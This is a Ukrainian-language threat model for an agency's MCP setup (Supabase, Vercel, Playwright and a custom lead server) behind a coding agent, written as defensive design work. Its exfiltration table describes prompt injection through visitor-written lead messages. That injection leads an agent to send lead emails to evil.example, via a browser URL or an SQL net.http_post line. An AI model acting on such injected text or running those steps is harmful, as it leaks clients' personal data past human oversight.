# Threat model: MCP-інтеграції LeadDesk (Task D)

Що спирається на конфіг: [`.mcp.json`](../../.mcp.json) (сервери `supabase`, `vercel`, `playwright`),
[`.claude/settings.json`](../../.claude/settings.json) (deny/allow), сервер `leaddesk` зі скоупом
`local` (Task C) і наш [`mcp/leaddesk-server`](../../mcp/leaddesk-server/). Дані в домашці синтетичні,
але модель загроз пишемо так, ніби це система клієнта.

**Правило агенції:** клієнтський проєкт до агента напряму не підключаємо — ні Supabase-проєкт,
ні команду Vercel, ні файл Figma клієнта. Працюємо з окремого акаунта без клієнтських організацій
(одноразовий проєкт / копія даних), а до клієнтської системи агент ходить лише через вузький
доменний сервер на кшталт `leaddesk`.

## Які дані бачить агент

| Сервер | Що потрапляє в контекст агента | Чиї це дані | Чи є там текст, який написали треті особи |
|---|---|---|---|
| `supabase` | Будь-які рядки будь-якої таблиці проєкту `oavfyhgroyqffxmcoeoe` через `execute_sql` — зокрема `full_name`, `email`, `message` лідів; схема (`list_tables`), міграції, розширення, URL проєкту й publishable-ключі, TS-типи; результати пошуку в документації Supabase | Клієнта (ліди — ПД його потенційних замовників) і наші (схема) | **Так**: `message` — вільний текст, який написав відвідувач публічної форми; це прямий канал prompt injection. Supabase загортає результат у `<untrusted-data-…>`, але сам вендор пише, що це не гарантія |
| `vercel` | Список деплоїв, метадані деплою (гілка, коміт, автор коміту), події й лог білду; за умови дозволу — проєкти, команди, логи рантайму, toolbar-треди, env-змінні проєкту (`get_project_env`, `filter_project_envs` — у сервері є, у нас не в allow) | Наші (агенції) і клієнта (його проєкт, його env) | **Так**: логи рантайму містять те, що надіслали користувачі сайту; toolbar-коментарі пише клієнт або його команда; повідомлення комітів — будь-хто з доступом до репозиторію |
| `playwright` | Accessibility-знімок (DOM-текст) і скріншоти будь-якої відкритої сторінки, повідомлення консолі, перелік мережевих запитів; через `browser_network_request` — заголовки й тіло окремого запиту, зокрема `Cookie` | Того, чия сторінка відкрита: наша `localhost:3000`, але після переходу — будь-чия | **Так**: кожна сторінка — недовірений текст; на `localhost:3000` це, наприклад, текст заявок, які показує дашборд |
| `leaddesk` | Лише `id`, `company`, `status`, `source`, `budget`, `createdAt` лідів; статус ліда після зміни, запис аудиту; markdown-довідка статусів | Клієнта (ліди), але без ПД: імені, email і тексту заявки сервер не віддає | **Частково**: назва компанії введена відвідувачем форми (коротке поле); вільного тексту (`message`) у відповідях немає — найвужчий канал injection з усіх |

## Канали виносу в цій же сесії

Канал виносу = будь-що, що відправляє дані за межі машини або робить їх видимими третім особам.
Для «lethal trifecta» досить одного з них у сесії, де є Supabase (приватні дані + текст третіх осіб).

| Канал | Звідки (сервер або вбудований інструмент) | Як ним можна винести дані | Закрито? Чим саме |
|---|---|---|---|
| `browser_navigate` на адресу з даними в query (`https://evil.example/?d=<email лідів>`) | `playwright` | Агент, прочитавши injection у `message` ліда чи на сторінці, відкриває URL, і сервер атакувальника отримує дані в запиті | **Частково.** `--allowed-origins http://localhost:3000` — лише зручність, вендор пише, що це не межа безпеки й не діє на редиректи. Справжнє закриття — **окрема сесія**: Playwright ніколи не вмикається разом із Supabase (правило сесій у `connections.md`). `browser_navigate` у нас в allow — тому в сесії з даними клієнта браузерного сервера не має бути взагалі |
| `browser_run_code_unsafe` / `browser_evaluate` — `fetch()` з JS сторінки чи процесу сервера | `playwright` | Довільний мережевий запит із даними; `run_code_unsafe` ще й виконує код у процесі сервера на нашій машині | **Так**: обидва в `deny` (`.claude/settings.json`); у `mcp-after.txt` їх немає. Не закриває: `browser_click`/`browser_type`/`browser_fill_form` на сторінці атакувальника теж можуть відправити форму з даними |
| `browser_file_upload` / `browser_drop` — завантажити локальний файл на сторінку | `playwright` | Прочитати `.env.local` чи інший файл проєкту й відправити формою | **Так**: у `deny` |
| `deploy_to_vercel` з `target: preview` | `vercel` | Задеплоїти код/дані — preview-URL публічний | **Так**: у `deny`. Не закриває: `use_vercel_cli` → `Bash` → `vercel deploy` (CLI тут не встановлено — це і є захід) |
| `reply_to_toolbar_thread`, `edit_toolbar_message` | `vercel` | Написати дані в коментар, який бачить клієнт і всі учасники проєкту | **Так**: усі 4 toolbar-інструменти в `deny` |
| `get_access_to_vercel_url` | `vercel` | Отримати посилання в обхід Deployment Protection і передати його далі | **Так**: у `deny` |
| `create_project_env` / `edit_project_env` / `create_drain` / вебхуки | `vercel` (є в сервері, не в нашому переліку 11) | Записати дані в env чи налаштувати log drain на чужий URL — постійний витік | **Ні deny, але й не allow**: кожен виклик потребує ручного схвалення; у `claude -p` — автоматично відхиляється. Це прогалина обов'язкового переліку з 11 — для клієнтського проєкту додали б їх у deny |
| `execute_sql` з `pg_net`/`http`-розширенням або запис у публічну таблицю | `supabase` | `select net.http_post('https://evil.example', …)`, якщо розширення ввімкнене, або `insert` у таблицю, яку читає публічний API | **Частково**: `execute_sql` не в allow — кожен виклик людина читає й схвалює; `functions` (edge functions) вимкнено в `features`; RLS на `leads` без політик. Не закриває: людина, що схвалює SQL «за пів секунди» |
| `WebFetch` | вбудований Claude Code | GET на адресу з даними в URL | **Ні deny**: Claude Code питає дозволу на кожен новий домен; у `claude -p` — відхиляється. Для клієнтської сесії додали б `WebFetch` у deny |
| `Bash` (`curl`, `git push`, `vercel …`) | вбудований Claude Code | Будь-який мережевий запит, пуш у публічний репозиторій | **Ні deny**: кожна команда потребує схвалення; правило `AGENTS.md` «нічого не залишає машину без так людини». Не закриває: втому людини від схвалень |
| `git push` закомічених артефактів | людина / `Bash` | Вивід інструментів (лог білду, `list_teams`) потрапляє в публічний форк | **Процесом**: `grep` по `docs/mcp/evidence` перед здачею; `list_teams`/`list_projects` у сесіях — `deny` або вручну, результати у файли не пишемо |

## Що ми забороняємо і чим саме

| Що заборонено | Механізм: deny, URL, прапорець, окремий акаунт, окрема сесія | Де це видно: файл і рядок | Чого цей механізм НЕ закриває |
|---|---|---|---|
| Інші проєкти й організації Supabase, створення/пауза проєктів | URL: `project_ref=…` + `features=database,development,docs` (немає `account`) | `.mcp.json`, рядок 5 | Сам OAuth-токен однаково виданий на весь акаунт; конектор `claude.ai Supabase` у тому самому акаунті — без `project_ref`, бачить усе (його треба вимикати в `/mcp`) |
| Edge functions і branching Supabase | URL: немає `functions`, `branching` у `features` | `.mcp.json`, рядок 5 | `execute_sql` лишається: через SQL можна зробити майже все, що дозволяє роль |
| Запис у Supabase без людини | `execute_sql`, `apply_migration` не в `allow` | `.claude/settings.json`, блок `allow` (рядки 21–38) | Людину, яка схвалює не читаючи; `read_only=true` (профіль A/B) прибирає `apply_migration`, але не `execute_sql` і не читання ПД |
| Запис через Supabase у прогоні A | URL: `read_only=true&features=database,docs` | команда `claude mcp add` у `ab-generic-vs-domain.md` | Читання всіх таблиць, зокрема `email` і `message` |
| Покупки, деплой, обхід захисту, toolbar у Vercel (11 інструментів) | `deny` точними іменами | `.claude/settings.json`, рядки 3–14 | `use_vercel_cli` → `Bash` → локальний `vercel` (закрито тим, що CLI не встановлено); інші записуючі інструменти поза переліком 11 (`create_project_env`, `update_project`, `request_rollback`…) — лише ручне схвалення; токен однаково має права всього користувача |
| JS у процесі Playwright, завантаження файлів, `evaluate` | `deny`: `browser_run_code_unsafe`, `webmcp_*`, `browser_file_upload`, `browser_drop`, `browser_evaluate` | `.claude/settings.json`, рядки 15–19; `docs/mcp/evidence/mcp-after.txt` | `browser_navigate`/`click`/`fill_form` у allow — навігація на чужий сайт і відправка форм лишаються |
| Інструменти, які додає сама сторінка | прапорець `--no-webmcp` + `deny` `mcp__playwright__webmcp_*` | `.mcp.json`, рядок 20; `.claude/settings.json`, рядок 16 | Текст сторінки однаково потрапляє в контекст і може містити injection |
| Логіни й кукі з мого справжнього браузера | прапорець `--isolated`; без `--extension`, `--cdp-endpoint`, `--user-data-dir` | `.mcp.json`, рядок 19 | Логін, який агент зробить сам у цій сесії (правило: у браузер агента не логінимось) |
| Самооновлення серверів | точні версії: `@playwright/mcp@0.0.82`, `@modelcontextprotocol/server` 2.1.0, `zod` 4.6.5 | `.mcp.json`, рядок 18; `mcp/leaddesk-server/package.json` | Віддалені сервери Supabase/Vercel оновлюються вендором без нашого відома — набір інструментів може змінитися (Vercel уже не має `get_deployment_build_logs` з інструкції; лог тепер віддає `list_deployment_events`) |
| Supabase разом із браузером, два записуючі сервери в одній сесії | окрема сесія на крок: `/mcp` — лише сервер поточного кроку; у headless — `--strict-mcp-config --mcp-config <один сервер>` | `docs/mcp/connections.md`, «Сесії» | **Закомічений `.mcp.json`: `claude -p` у корені репозиторію піднімає всі три сервери разом без питань** — саме тому headless-прогони ми запускали лише зі `--strict-mcp-config` |
| ПД лідів у відповіді доменного сервера | код: `publicLead()` віддає 6 полів | `mcp/leaddesk-server/src/server.mjs` | Хто має `supabase` у тій самій сесії, однаково прочитає `email` через SQL |
| Зміна статусу «тихо» | опис `leaddesk_set_lead_status` («ЗМІНЮЄ ДАНІ… дочекайся підтвердження»), `readOnlyHint: false`, не в allow; аудит на кожну зміну | `server.mjs`; `docs/mcp/set-status.json` | Аудит живе в пам'яті процесу — після перезапуску зникає; у прод-версії — запис у БД |
| Робота з клієнтського акаунта | окремий особистий акаунт і одноразовий проєкт | `docs/mcp/connections.md`, «Акаунти» | Конектори claude.ai, прив'язані до робочого логіна, з'являються в кожній сесії — їх вимикаємо в `/mcp` |

## Що пишемо в договір

- **Які системи підключаємо і з якими правами.** Агент працює з копією даних клієнта в окремому
  проєкті агенції або через вузький доменний сервер (лише перелічені дії: пошук лідів за статусом,
  зміна статусу з аудитом). Прямого підключення агента до продакшн-бази, хостингу чи дизайн-файлів
  клієнта немає. Перелік серверів і прав — додаток до договору (наш `connections.md`), зміни в ньому —
  через погодження.
- **Чиї акаунти.** Агент підключається з окремого акаунта агенції без клієнтських організацій і
  команд; власник акаунта — агенція (названа відповідальна особа), доступ до нього має лише
  проєктна команда; токени відкликаються після завершення робіт.
- **Куди їдуть дані.** Дані, які бачить агент, потрапляють у контекст моделі, тобто до провайдера
  LLM (Anthropic), і до вендорів MCP-серверів (Supabase, Vercel; для Figma — content training за
  замовчуванням увімкнено на планах Starter і Professional, тож для клієнтських файлів — лише
  план із вимкненим навчанням або взагалі без Figma MCP). ПД кінцевих користувачів клієнта (email,
  імена, тексти заявок) агенту без потреби не передаємо — доменний сервер їх не віддає.
- **Supabase MCP — інструмент розробника.** Він працює з правами розробника (повз RLS); клієнтам
  чи кінцевим користувачам його не віддаємо і в продукт не вбудовуємо.
- **Кожна зміна даних чи публікація — лише після схвалення людини.** Агент не має автоматичного
  дозволу на запис, деплой, покупки й повідомлення клієнту; усі такі дії журналюються (аудит
  доменного сервера, історія міграцій, журнал сесії).
- **Інциденти.** Якщо токен скомпрометовано — агенція відкликає його й повідомляє клієнта протягом
  24 годин; зона ураження обмежена одним проєктом (`project_ref`) і переліком прав із додатка.
